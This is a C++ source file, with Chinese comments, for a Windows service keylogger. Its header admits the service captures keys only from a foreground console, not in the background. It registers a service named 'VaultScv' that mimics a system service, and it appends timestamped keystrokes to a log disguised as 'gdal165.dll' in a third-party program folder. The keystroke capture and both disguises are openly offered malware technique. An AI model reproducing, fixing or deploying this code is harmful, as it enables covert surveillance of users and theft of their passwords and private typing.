/*
写了个键盘监听写log的服务程序

但是其实在后台不能工作，因为没有焦点，只有在前台cmd窗口才能实现。



*/


#pragma warning(disable:4996)

#include <string>
#include <tchar.h>
#include <stdio.h>
#include <windows.h>
#include <winsvc.h>
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")
#include <time.h>
#include <conio.h>


#include <fstream>
using namespace std;

//typedef enum __bool { false = 0, true = 1, } bool;
//定义一些全局变量和函数
void ServiceMain(DWORD argc, LPTSTR *argv);
void ServiceCtrlHandler(DWORD dwControlCode);
//SCM报告服务状态信息
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode,
    DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint,
    DWORD dwWaitHint);
BOOL InitThread(); //创建线程来运行我们的任务
DWORD sysnap(LPDWORD param); //我们这个服务所要完成的任务
HANDLE hServiceThread;
void KillService();
char *strServiceName = "VaultScv"; //标识服务的内部名
                                   //LPWSTR strServiceName = "VaultScv"; //标识服务的内部名
SERVICE_STATUS_HANDLE nServiceStatusHandle; //存储调用RegisterServiceCtrlHandler返回的句柄
HANDLE killServiceEvent;
BOOL nServiceRunning;
DWORD nServiceCurrentStatus;
FILE * Fces = NULL;



void main(int argc, char *argv[])
{
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    SERVICE_TABLE_ENTRY servicetable[] = { { wszClassName2,(LPSERVICE_MAIN_FUNCTION)ServiceMain },{ NULL,NULL } };
    BOOL success;
    // StartServiceCtrlDispatcher 函数负责把程序主线程连接到服务控制管理程序
    success = StartServiceCtrlDispatcher(servicetable);
    if (!success)
    {
        printf("failed!");
    }
}


void ServiceMain(DWORD argc, LPTSTR *argv)
{
    //Sleep(20 * 1000);
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    BOOL success;
    //把ServiceCtrlHandler注册为服务控制器,接受来自SCM的请求并做出处理,
    nServiceStatusHandle = RegisterServiceCtrlHandler(wszClassName2, (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    //判断是否注册成功,否则返回
    if (!nServiceStatusHandle) { return; }
    //注册成功后向SCM报告服务状态信息,因为服务还没初始化完成,所以当前服务状态为SERVICE_START_PENDING
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 1, 3000);
    if (!success) { return; }
    //创建一个事件,在函数的最后将用该事件来保持函数的运行直到SCM发出停止请求才返回
    killServiceEvent = CreateEvent(0, TRUE, FALSE, 0);
    if (killServiceEvent == NULL) { return; }
    //向SCM报告服务状态信息
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 2, 1000);
    if (!success) { return; }
    //我们的服务开始运行任务了,当前状态设置为SERVICE_RUNNING
    nServiceCurrentStatus = SERVICE_RUNNING;
    success = ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0, 0, 0);
    if (!success) { return; }
    //InitThread()创建一个线程来运行我们的sysnap()函数
    success = InitThread();
    if (!success) { return; }
    //sysnap()函数运行完了之后返回ServiceMain(),ServiceMain()调用WaitForSingleObject,因为服务被停止之前ServiceMain()不会结束
    WaitForSingleObject(killServiceEvent, INFINITE);
    CloseHandle(killServiceEvent);
}


//向SCM报告服务状态信息,可以说是更新信息吧,它接受的参数都是SERVICE_STATUS结构成员


BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint, DWORD dwWaitHint)
{
    BOOL success;
    SERVICE_STATUS nServiceStatus; //定义一个SERVICE_STATUS类型结构nServiceStatus
    nServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; //表示我们的服务是独占一个进程的服务
    nServiceStatus.dwCurrentState = dwCurrentState; //当前服务状态
    if (dwCurrentState == SERVICE_START_PENDING)
    {
        nServiceStatus.dwControlsAccepted = 0; //服务的初始化没有完成
    }
    else
    {
        nServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; //通知 SCM 服务接受哪个域。这里允许 STOP 和SHUTDOWN 请求
    }
    //dwServiceSpecificExitCode在你终止服务并报告退出细节时很有用。初始化服务时并不退出，因此值为 0
    if (dwServiceSpecificExitCode == 0)
    {
        nServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    }
    else
    {
        nServiceStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
    }
    nServiceStatus.dwServiceSpecificExitCode = dwServiceSpecificExitCode;
    nServiceStatus.dwCheckPoint = dwCheckPoint;
    nServiceStatus.dwWaitHint = dwWaitHint;
    //设置好nServiceStatus后,向SCM报告服务状态
    success = SetServiceStatus(nServiceStatusHandle, &nServiceStatus);
    if (!success)
    {
        KillService();
        return success;
    }
    else
        return success;
}


BOOL InitThread()
{
    DWORD id;
    hServiceThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sysnap, 0, 0, &id);
    if (hServiceThread == 0)
    {
        return false;
    }
    else
    {
        nServiceRunning = true;
        return true;
    }
}


DWORD sysnap(LPDWORD param)
{

    int ch;
    FILE *fp = NULL;
    bool printed = false;


    while (nServiceRunning)
    {
        time_t tt = time(NULL);
        tm* t = localtime(&tt);
        fp = fopen("D:\\Program Files\\Bentley\\Acute3D Viewer\\bin\\gdal165.dll", "a+");

        char time_tmp[100] = { 0 };
        if (t->tm_sec == 0 && printed == false) {
            sprintf(time_tmp, "\n%d-%d-%d %d:%d:%d\n", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);
            fputs(time_tmp, fp);
            printed = true;
        }
        if (t->tm_sec == 1)
        {
            printed = false;
        }

        if (_kbhit()) {//如果有按键按下，则_kbhit()函数返回真
            ch = _getch();//使用_getch()函数获取按下的键值
            char tmp[10] = { 0 };
            char chr = (char)ch;
            sprintf(tmp, "%c", chr);
            fputs(tmp, fp);
        }
        fclose(fp);
    }
    return 0;
}


void KillService()
{
    nServiceRunning = false;
    ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0, 0, 0);
}


void ServiceCtrlHandler(DWORD dwControlCode)
{
    BOOL success;
    switch (dwControlCode)
    {
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    case SERVICE_CONTROL_STOP:
        nServiceCurrentStatus = SERVICE_STOP_PENDING;
        success = ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0, 1, 3000);//先更新服务状态为SERVICDE_STOP_PENDING,再停止服务
        KillService();
        return;
    default:
        break;
    }
    ReportStatusToSCMgr(nServiceCurrentStatus, NO_ERROR, 0, 0, 0);
}